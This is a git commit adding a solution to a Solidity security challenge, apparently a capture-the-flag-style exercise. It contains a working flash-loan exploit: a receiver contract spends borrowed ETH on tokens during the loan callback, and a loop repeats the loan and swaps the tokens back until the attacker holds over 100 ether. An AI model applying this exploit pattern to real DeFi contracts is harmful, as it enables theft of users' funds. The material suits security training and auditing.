efce8d7a5b0872bfcf48dce130f28c5bf7136b55
saeta.eth <saeta@aelindao.xyz>
2023-08-07 18:16:10 -0300

    Add challenge 6 solution

--- test/Challenge6.t.sol
+++ test/Challenge6.t.sol
@@ -3,14 +3,44 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol";
+import {IERC3156FlashLender, IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
 
 /*////////////////////////////////////////////////////////////
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
+contract FlashLoanReceiver {
+    bytes32 private constant CALLBACK_SUCCESS =
+        keccak256("ERC3156FlashBorrower.onFlashLoan");
 
+    YieldPool public yieldPool;
+    SecureumToken token;
 
+    constructor(address _yieldPool, address _token) {
+        yieldPool = YieldPool(payable(_yieldPool));
+        token = SecureumToken(_token);
+    }
+
+    // Flashloan callback.
+    function onFlashLoan(
+        address _receiver,
+        address _token,
+        uint256 _amount,
+        uint256 _fee,
+        bytes calldata data
+    ) external returns (bytes32) {
+        // Use all ETH for buying Tokens while paying the loan.
+        yieldPool.ethToToken{value: address(this).balance}();
+
+        // Send Tokens to attacker account
+        token.transfer(_receiver, token.balanceOf(address(this)));
+
+        return CALLBACK_SUCCESS;
+    }
+
+    receive() external payable {}
+}
 
 /*////////////////////////////////////////////////////////////
 //                     TEST CONTRACT                        //
@@ -47,12 +77,41 @@ contract Challenge6Test is Test {
         // forge test --match-contract Challenge6Test -vvvv //
         ////////////////////////////////////////////////////*/
 
+        FlashLoanReceiver flashLoanReceiver = new FlashLoanReceiver(
+            address(yieldPool),
+            address(token)
+        );
 
+        while (address(attacker).balance < 100 ether) {
+            // Transfer everything to the FlashLoanReceiver contract.
+            payable(address(flashLoanReceiver)).transfer(
+                address(attacker).balance
+            );
 
+            // Flashloan as much ETH as we can afford.
+            yieldPool.flashLoan(
+                IERC3156FlashBorrower(address(flashLoanReceiver)),
+                yieldPool.ETH(),
+                address(flashLoanReceiver).balance * 100,
+                hex""
+            );
+
+            // Exchange Tokens for ETH.
+            token.approve(
+                address(yieldPool),
+                token.balanceOf(address(attacker))
+            );
+
+            yieldPool.tokenToEth(token.balanceOf(address(attacker)));
+        }
 
         //==================================================//
         vm.stopPrank();
 
-        assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
+        assertGt(
+            address(attacker).balance,
+            100 ether,
+            "hacker should have more than 100 ether"
+        );
     }
 }
